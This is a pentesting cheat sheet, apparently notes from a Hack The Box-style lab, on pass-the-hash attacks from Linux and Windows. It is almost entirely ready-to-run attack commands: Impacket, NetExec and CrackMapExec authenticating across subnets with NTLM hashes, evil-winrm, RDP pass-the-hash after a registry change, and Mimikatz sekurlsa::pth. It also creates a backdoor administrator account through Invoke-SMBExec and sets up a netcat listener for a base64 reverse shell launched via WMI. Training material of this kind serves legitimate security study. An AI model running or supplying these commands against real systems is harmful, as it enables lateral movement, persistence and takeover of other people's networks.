 
## - Linux


```bash
# Pass the Hash with Impacket PsExec
impacket-psexec <username>@<IP> -hashes :<hash>

# Alternative tools :
impacket-wmiexec
impacket-atexec
impacket-smbexec

# Pass the Hash with NetExec
netexec smb 172.16.1.0/24 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453

# NetExec - Command Execution
netexec smb 10.129.201.126 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453 -x whoami

# Scan a subnet and authenticate with username and hash (pass the hash)
crackmapexec smb 172.16.1.0/24 -u <username> -d . -H <hash>

# Connect to Windows remote management (WinRM) with username and NTLM hash
evil-winrm -i <IP>  -u <username> -H "64f12cddaa88057e06a81b54e73b949b"

# Execute 'whoami' command on target host with given user and hash
crackmapexec smb <IP> -u <username> -d . -H <hash> -x whoami

# On the target Windows machine, enable Restricted Admin Mode to allow PtH authentication
reg add HKLM\\System\\CurrentControlSet\\Control\\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f

# Connect to RDP server using username and NTLM hash (Pass-the-Hash)
xfreerdp /v:<IP> /u:<username> /pth:<hash>
```

---

## - Windows 


```bash
# Pass the Hash from Windows Using Mimikatz
mimikatz.exe privilege::debug "sekurlsa::pth /user:julio /rc4:64F12CDDAA88057E06A81B54E73B949B /domain:inlanefreight.htb /run:cmd.exe" exit

# Pass the Hash with PowerShell Invoke-TheHash (Windows)
cd C:\\tools\\Invoke-TheHash\\
Import-Module .\\Invoke-TheHash.psd1
# Execute a command on target 172.16.1.10 using SMB with the NTLM hash instead of password
Invoke-SMBExec -Target 172.16.1.10 -Domain inlanefreight.htb -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command "net user mark Password123 /add && net localgroup administrators mark /add" -Verbose

# Start Netcat in listening mode on port 8001, verbose output
.\\nc.exe -lvnp 8001

# Reverse Shell Generator per Powershell
Shkojm ne revshells.com, to create reverse shell script ne base64

# Invoke-TheHash with WMI
Import-Module .\\Invoke-TheHash.psd1
# Perdoriom nje PTH dhe ekzekutojm nje komand si revshell
Invoke-WMIExec -Target DC01 -Domain <domain> -Username <user> -Hash 64F12CDDAA88057E06A81B54E73B949B -Command "Reverse Shell in Base64"
```